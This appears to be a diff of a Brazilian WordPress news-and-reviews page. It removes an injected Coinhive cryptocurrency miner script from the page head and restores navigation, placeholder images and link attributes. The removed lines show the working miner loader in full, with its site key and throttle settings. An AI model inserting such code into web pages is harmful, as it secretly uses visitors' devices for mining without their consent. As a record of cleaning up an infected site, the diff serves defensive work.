@@ -81,12 +81,7 @@ var a2a_config=a2a_config||{};a2a_config.callbacks=a2a_config.callbacks||[];a2a_
   #nav-header .nav ul { background-color: #000000; }
 }
         #footer-bottom { background-color: #000000; }body { background-color: #eaeaea; }</style>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script><script>
-var speed = 0.17;
-if( window.matchMedia("only screen and (max-width: 760px)").matches ) {
-	speed = 0.8
-}
-var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:speed});setTimeout(function(){__m.start();},3000);</script></head>
+</head>
 
 <body class="archive category category-filmes-do-chico category-10 col-3cm full-width topbar-enabled header-desktop-sticky header-mobile-sticky unknown">
 
@@ -94,18 +89,70 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
   
   <header id="header" class="main-menu-mobile-on one-mobile-menu main_menu header-ads-desktop  topbar-transparent">
-        <!--/#nav-topbar-->  
-        <!--/#nav-topbar-->  
+        <nav class="nav-container group mobile-menu mobile-sticky" id="nav-mobile" data-menu-id="header-1">
+  <div class="mobile-title-logo-in-header">                  <p class="site-title"><a class="custom-logo-link" href="/" rel="home" title="Críticas | Home page">Críticas</a></p>
+                </div>
+        
+                    <!-- <div class="ham__navbar-toggler collapsed" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="ham-toggler-menu__span"></span>
+          </div>
+        </div> -->
+        <div class="ham__navbar-toggler-two collapsed" title="Menu" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="line line-1"></span>
+            <span class="line line-2"></span>
+            <span class="line line-3"></span>
+          </div>
+        </div>
+            
+      <div class="nav-text"></div>
+      <div class="nav-wrap container">
+                  <ul class="nav container-inner group mobile-search">
+                            <li>
+                  <form method="get" class="searchform themeform" action="http://criticas.centrodouniverso.com.br/">
+	<div>
+		<input type="text" class="search" name="s" onblur="if(this.value=='')this.value='To search type and hit enter';" onfocus="if(this.value=='To search type and hit enter')this.value='';" value="To search type and hit enter" />
+	</div>
+</form>                </li>
+                      </ul>
+                <ul id="menu-menu-principal" class="nav container-inner group"><li id="menu-item-755" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-755"><a href="/">Home</a></li>
+<li id="menu-item-2323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2323"><a href="/sobre">Sobre</a></li>
+<li id="menu-item-2271" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2271"><a href="/contato">Contato</a></li>
+</ul>      </div>
+</nav><!--/#nav-topbar-->  
+        <nav class="nav-container group desktop-menu desktop-sticky" id="nav-topbar" data-menu-id="header-2">
+    <div class="nav-text"></div>
+  <div class="topbar-toggle-down">
+    <i class="fa fa-angle-double-down" aria-hidden="true" data-toggle="down" title="Expand menu"></i>
+    <i class="fa fa-angle-double-up" aria-hidden="true" data-toggle="up" title="Collapse menu"></i>
+  </div>
+  <div class="nav-wrap container">
+    <ul class="nav container-inner group"><li ><a href="/">Home</a></li><li class="page_item page-item-2270"><a href="/contato">Contato</a></li><li class="page_item page-item-2322"><a href="/sobre">Sobre</a></li></ul>  </div>
+      <div id="topbar-header-search" class="container">
+      <div class="container-inner">
+        <div class="toggle-search"><i class="fa fa-search"></i></div>
+        <div class="search-expand">
+          <div class="search-expand-inner"><form method="get" class="searchform themeform" action="http://criticas.centrodouniverso.com.br/">
+	<div>
+		<input type="text" class="search" name="s" onblur="if(this.value=='')this.value='To search type and hit enter';" onfocus="if(this.value=='To search type and hit enter')this.value='';" value="To search type and hit enter" />
+	</div>
+</form></div>
+        </div>
+      </div><!--/.container-inner-->
+    </div><!--/.container-->
+  
+</nav><!--/#nav-topbar-->  
   <div class="container group">
         <div class="container-inner">
 
-                    <div class="group pad central-header-zone" style="background-image:url('/banner_criticas.png')">
+                    <div class="group pad central-header-zone">
                   <div class="logo-tagline-group">
                                         <p class="site-title"><a class="custom-logo-link" href="/" rel="home" title="Críticas | Home page">Críticas</a></p>
                                                                 <p class="site-description">Fique por dentro do que rola no mundo do cinema</p>
                                         </div>
 
-                                </div><img style='display:none' src='/banner_criticas.png'></img>
+                                </div>
       
                 <nav class="nav-container group desktop-menu" id="nav-header" data-menu-id="header-3">
     <div class="nav-text"><!-- put your mobile menu text here --></div>
@@ -139,18 +186,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5606" title="Mercedes da o troco, e Hamilton vence GP da Espanha">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803c7f066" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3b6de85" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803c7f066' ).animateSvg();
+                $( '#59bd5e3b6de85' ).animateSvg();
               });
-            } else { $( '#59bb803c7f066' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3b6de85' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Mercedes da o troco, e Hamilton vence GP da Espanha" data-hu-post-id="59bb803c7f066" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Mercedes da o troco, e Hamilton vence GP da Espanha" data-hu-post-id="59bd5e3b6de85" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -166,7 +213,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5606" rel="bookmark" title="Mercedes da o troco, e Hamilton vence GP da Espanha" target="_blank">Mercedes da o troco, e Hamilton vence GP da Espanha</a>
+			<a href="/archives/5606" rel="bookmark" title="Mercedes da o troco, e Hamilton vence GP da Espanha">Mercedes da o troco, e Hamilton vence GP da Espanha</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -179,18 +226,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5605" title="Na estreia do brasileirão Atlético-PR é goleado pelo Bahia">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803c824b0" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3b7714f" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803c824b0' ).animateSvg();
+                $( '#59bd5e3b7714f' ).animateSvg();
               });
-            } else { $( '#59bb803c824b0' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3b7714f' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Na estreia do brasileirão Atlético-PR é goleado pelo Bahia" data-hu-post-id="59bb803c824b0" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Na estreia do brasileirão Atlético-PR é goleado pelo Bahia" data-hu-post-id="59bd5e3b7714f" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -206,7 +253,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5605" rel="bookmark" title="Na estreia do brasileirão Atlético-PR é goleado pelo Bahia" target="_blank">Na estreia do brasileirão Atlético-PR é goleado pelo Bahia</a>
+			<a href="/archives/5605" rel="bookmark" title="Na estreia do brasileirão Atlético-PR é goleado pelo Bahia">Na estreia do brasileirão Atlético-PR é goleado pelo Bahia</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -219,18 +266,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5604" title="Projetos do Plano de Recuperação Fiscal devem ser votados até início de junho">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803c85d1f" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3b7f943" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803c85d1f' ).animateSvg();
+                $( '#59bd5e3b7f943' ).animateSvg();
               });
-            } else { $( '#59bb803c85d1f' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3b7f943' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Projetos do Plano de Recuperação Fiscal devem ser votados até início de junho" data-hu-post-id="59bb803c85d1f" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Projetos do Plano de Recuperação Fiscal devem ser votados até início de junho" data-hu-post-id="59bd5e3b7f943" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -246,7 +293,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5604" rel="bookmark" title="Projetos do Plano de Recuperação Fiscal devem ser votados até início de junho" target="_blank">Projetos do Plano de Recuperação Fiscal devem ser votados até início de junho</a>
+			<a href="/archives/5604" rel="bookmark" title="Projetos do Plano de Recuperação Fiscal devem ser votados até início de junho">Projetos do Plano de Recuperação Fiscal devem ser votados até início de junho</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -259,18 +306,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5603" title="Prefeitura de Piraquara abre concurso com salário de até R$ 10 mil">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803c8a53c" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3b88c2d" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803c8a53c' ).animateSvg();
+                $( '#59bd5e3b88c2d' ).animateSvg();
               });
-            } else { $( '#59bb803c8a53c' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3b88c2d' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Prefeitura de Piraquara abre concurso com salário de até R$ 10 mil" data-hu-post-id="59bb803c8a53c" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Prefeitura de Piraquara abre concurso com salário de até R$ 10 mil" data-hu-post-id="59bd5e3b88c2d" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -286,7 +333,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5603" rel="bookmark" title="Prefeitura de Piraquara abre concurso com salário de até R$ 10 mil" target="_blank">Prefeitura de Piraquara abre concurso com salário de até R$ 10 mil</a>
+			<a href="/archives/5603" rel="bookmark" title="Prefeitura de Piraquara abre concurso com salário de até R$ 10 mil">Prefeitura de Piraquara abre concurso com salário de até R$ 10 mil</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -299,18 +346,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5602" title="Postos aplicaram 6.728 vacinas no Dia D contra a gripe">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803c8dd5e" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3b909aa" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803c8dd5e' ).animateSvg();
+                $( '#59bd5e3b909aa' ).animateSvg();
               });
-            } else { $( '#59bb803c8dd5e' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3b909aa' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Postos aplicaram 6.728 vacinas no Dia D contra a gripe" data-hu-post-id="59bb803c8dd5e" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Postos aplicaram 6.728 vacinas no Dia D contra a gripe" data-hu-post-id="59bd5e3b909aa" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -326,7 +373,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5602" rel="bookmark" title="Postos aplicaram 6.728 vacinas no Dia D contra a gripe" target="_blank">Postos aplicaram 6.728 vacinas no Dia D contra a gripe</a>
+			<a href="/archives/5602" rel="bookmark" title="Postos aplicaram 6.728 vacinas no Dia D contra a gripe">Postos aplicaram 6.728 vacinas no Dia D contra a gripe</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -339,18 +386,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5601" title="Passagens de ônibus intermunicipais sobem no Paraná">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803c91f98" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3b9ac04" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803c91f98' ).animateSvg();
+                $( '#59bd5e3b9ac04' ).animateSvg();
               });
-            } else { $( '#59bb803c91f98' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3b9ac04' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Passagens de ônibus intermunicipais sobem no Paraná" data-hu-post-id="59bb803c91f98" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Passagens de ônibus intermunicipais sobem no Paraná" data-hu-post-id="59bd5e3b9ac04" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -366,7 +413,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5601" rel="bookmark" title="Passagens de ônibus intermunicipais sobem no Paraná" target="_blank">Passagens de ônibus intermunicipais sobem no Paraná</a>
+			<a href="/archives/5601" rel="bookmark" title="Passagens de ônibus intermunicipais sobem no Paraná">Passagens de ônibus intermunicipais sobem no Paraná</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -379,18 +426,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5600" title="Enem 2017 já tem mais de 3 milhões de inscritos">
-				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bb803c95d9a" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
+				        <svg class="hu-svg-placeholder thumb-medium-empty" id="59bd5e3ba0941" viewbox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path d="M928 832q0-14-9-23t-23-9q-66 0-113 47t-47 113q0 14 9 23t23 9 23-9 9-23q0-40 28-68t68-28q14 0 23-9t9-23zm224 130q0 106-75 181t-181 75-181-75-75-181 75-181 181-75 181 75 75 181zm-1024 574h1536v-128h-1536v128zm1152-574q0-159-112.5-271.5t-271.5-112.5-271.5 112.5-112.5 271.5 112.5 271.5 271.5 112.5 271.5-112.5 112.5-271.5zm-1024-642h384v-128h-384v128zm-128 192h1536v-256h-828l-64 128h-644v128zm1664-256v1280q0 53-37.5 90.5t-90.5 37.5h-1536q-53 0-90.5-37.5t-37.5-90.5v-1280q0-53 37.5-90.5t90.5-37.5h1536q53 0 90.5 37.5t37.5 90.5z"/></svg>
 
         <script type="text/javascript">
           jQuery( function($){
             if ( $('#flexslider-featured').length ) {
               $('#flexslider-featured').on('featured-slider-ready', function() {
-                $( '#59bb803c95d9a' ).animateSvg();
+                $( '#59bd5e3ba0941' ).animateSvg();
               });
-            } else { $( '#59bb803c95d9a' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
+            } else { $( '#59bd5e3ba0941' ).animateSvg( { svg_opacity : 0.3, filter_opacity : 0.5 } ); }
           });
         </script>
-         <img class="hu-img-placeholder" src="/default_image_649.png" alt="Enem 2017 já tem mais de 3 milhões de inscritos" data-hu-post-id="59bb803c95d9a" />															</a>
+         <img class="hu-img-placeholder" src="/wp-content/themes/hueman/assets/front/img/thumb-medium-empty.png" alt="Enem 2017 já tem mais de 3 milhões de inscritos" data-hu-post-id="59bd5e3ba0941" />															</a>
 					</div><!--/.post-thumbnail-->
 
 		<div class="post-meta group">
@@ -406,7 +453,7 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 		</div><!--/.post-meta-->
 
 		<h2 class="post-title entry-title">
-			<a href="/archives/5600" rel="bookmark" title="Enem 2017 já tem mais de 3 milhões de inscritos" target="_blank">Enem 2017 já tem mais de 3 milhões de inscritos</a>
+			<a href="/archives/5600" rel="bookmark" title="Enem 2017 já tem mais de 3 milhões de inscritos">Enem 2017 já tem mais de 3 milhões de inscritos</a>
 		</h2><!--/.post-title-->
 
 				<div class="entry excerpt entry-summary">
@@ -419,18 +466,18 @@ var __m=new CoinHive.User("hjflNfOWrK7bMwGmLrOdjoLaolDb8dZf","DW",{throttle:spee
 
 		<div class="post-thumbnail">
 			<a href="/archives/5599" title="Lewis Hamilton vence GP da Espanha">
